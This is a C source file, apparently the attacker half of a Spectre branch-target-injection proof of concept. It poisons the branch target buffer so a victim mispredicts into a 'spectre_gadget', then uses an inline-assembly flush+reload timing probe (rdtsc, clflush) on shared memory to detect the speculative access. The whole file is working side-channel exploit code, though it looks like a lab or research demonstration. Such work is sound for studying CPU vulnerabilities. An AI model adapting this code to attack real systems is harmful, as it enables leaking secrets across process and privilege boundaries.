#include "common.h"

#define PRINTNUM 1000

unsigned probe(char *adrs)
{
    volatile unsigned long time;
    asm __volatile__(
        "    mfence             \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    lfence             \n"
        "    mov esi, eax       \n"
        "    mov eax,[%1]       \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    sub eax, esi       \n"
        "    clflush [%1]       \n"
        "    mfence             \n"
        "    lfence             \n"
        : "=a"(time)
        : "c"(adrs)
        : "%esi", "%edx");
    return time;
}

int main(int argc, char *argv[])
{

    //Make spec function confuse safe_function with spectre_gadget
    codePtr = spectre_gadget;

    char dummy;
    int hits = 0;
    int tries = 0;
    char *sharedmem = open_shared_mem();
    setvbuf(stdout, NULL, _IONBF, 0);

    while (1)
    {
        //Inject the target in the BTB
        spec(&dummy, &dummy, 0);

        //Allow for victim to execute and misspredict to spectre_gadget
        usleep(1);

        //probe the 1-bit flush+reload side channel
        if (probe((char *)&sharedmem[2000]) < 0x90)
        {
            printf("+");
        }
    }
}